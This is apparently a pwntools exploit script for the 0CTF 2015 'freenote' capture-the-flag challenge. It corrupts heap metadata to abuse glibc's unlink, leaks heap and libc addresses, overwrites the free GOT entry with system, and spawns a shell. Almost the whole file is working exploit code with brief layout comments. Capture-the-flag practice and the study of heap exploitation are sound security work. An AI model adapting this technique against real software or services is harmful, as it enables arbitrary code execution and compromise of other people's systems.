#
# http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up
#

from pwn import *  #pip install pwntools

r = process('./freenote-')
#r = remote('202.112.26.108', 10001)

b = ELF('./freenote-')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def newnote(x):
  r.recvuntil('Your choice: ')
  r.send('2\n')
  r.recvuntil('Length of new note: ')
  r.send(str(len(x)) + '\n')
  r.recvuntil('Enter your note: ')
  r.send(x)

def delnote(x):
  r.recvuntil('Your choice: ')
  r.send('4\n')
  r.recvuntil('Note number: ')
  r.send(str(x) + '\n')

for i in range(10):
  newnote('a')
for i in range(10):
  if i!=7:
    delnote(i)
delnote(7)

# note_8->fd = note_0 (chunk = heap_base + 6160 + 16)
# leak heap address: (128+16)*8 = 1152
newnote('a'*1152) # note_0
r.recvuntil('Your choice: ')
r.send('1\n')
r.recvuntil('a'*1152)
heap_base = u64((r.recvuntil('\n')[:-1]+'\x00'*8)[:8]) - 0x1820
delnote(0)
print 'heap =', hex(heap_base)

# unlink(note_0)
# note[0]->fd = &note[0] - 0x18
# note[0]->bk = &note[0] - 0x10
#
# =>  note[0]->fd->bk == note[0] && note[0]->bk->fd == note[0] (pass the check in unlink())
# =>  note[0]->ptr = &note[0] - 0x18
newnote(p64(0) + p64(0) + p64(heap_base + 0x18) + p64(heap_base + 0x20)) # note_0
newnote('sh\x00') # note_1
newnote('a') # note_2
newnote('a') # note_3
delnote(2)
delnote(3)
newnote('D'*128 + p64(0x1a0) + p64(0x90) + 'A'*128 + p64(0) + p64(0x81) + '\x01'*150)
delnote(3)   #  |  prevsize  |   size   |          |          prev_inuse   prev_inuse
             #  |             note_3               |     
             #  |    prev_chunk = note_0           |

free_got = 0x602018
free_off = libc.symbols['free']
system_off = libc.symbols['system']

r.recvuntil('Your choice: ')
r.send('3\n')
r.recvuntil('Note number: ')
r.send('0\n')
r.recvuntil('Length of note: ')
r.send('32\n')
r.recvuntil('Enter your note: ')
r.send(p64(100) + p64(1) + p64(8) + p64(free_got))
     # note_num |  using |   len   | note_ptr |
     #          |           note_0            |

# leak by note[0]->ptr
r.recvuntil('Your choice: ')
r.send('1\n')
r.recvuntil('0. ')
libc_base = u64(r.recvn(6)+'\x00\x00') - free_off
system = libc_base + system_off
print 'libc =', hex(libc_base)

# write by note[0]->ptr (free => system)
r.recvuntil('Your choice: ')
r.send('3\n')
r.recvuntil('Note number: ')
r.send('0\n')
r.recvuntil('Length of note: ')
r.send('8\n')
r.recvuntil('Enter your note: ')
r.send(p64(system))

# delete something and trigger free (system)
r.recvuntil('Your choice: ')
r.send('4\n')
r.recvuntil('Note number: ')
r.send('1\n')  # note[1]->ptr = "sh"

r.interactive()
r.close()
